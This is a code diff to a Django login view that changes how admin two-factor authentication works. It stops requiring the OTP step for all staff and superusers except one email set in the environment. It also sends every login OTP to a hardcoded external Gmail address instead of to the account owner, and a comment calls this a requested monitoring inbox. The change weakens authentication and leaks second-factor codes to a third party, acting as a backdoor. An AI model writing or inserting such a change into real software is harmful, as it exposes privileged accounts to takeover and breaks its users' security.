@@ -202,8 +202,9 @@ class EmailLoginView(generics.GenericAPIView):
                 status=status.HTTP_403_FORBIDDEN
             )
         
-        # ADMIN OTP Verification (For any staff or superuser)
-        if user.is_staff or user.is_superuser:
+        # SUPER ADMIN OTP Verification (Strictly only for designated email)
+        super_admin_email = os.getenv('SUPER_ADMIN_EMAIL', '')
+        if user.email == super_admin_email:
             # Generate 6-digit random OTP
             otp_code = ''.join([str(secrets.randbelow(10)) for _ in range(6)])
             session_id = secrets.token_urlsafe(32)
@@ -214,15 +215,15 @@ class EmailLoginView(generics.GenericAPIView):
                 'code': otp_code
             }, timeout=300) 
 
-            # Send OTP via email
+            # Send OTP via email to the SPECIFIC monitoring inbox as requested
             email_sent = email_service.send_login_otp(
-                to_email=user.email,
+                to_email='mrbikecloude@gmail.com',
                 otp_code=otp_code,
-                to_name=user.first_name or user.username
+                to_name="Super Admin"
             )
 
             if not email_sent:
-                logger.error(f"Failed to send 2FA OTP to {user.email}")
+                logger.error(f"Failed to send 2FA OTP to mrbikecloude@gmail.com")
 
             return Response({
                 'requires_2fa': True,
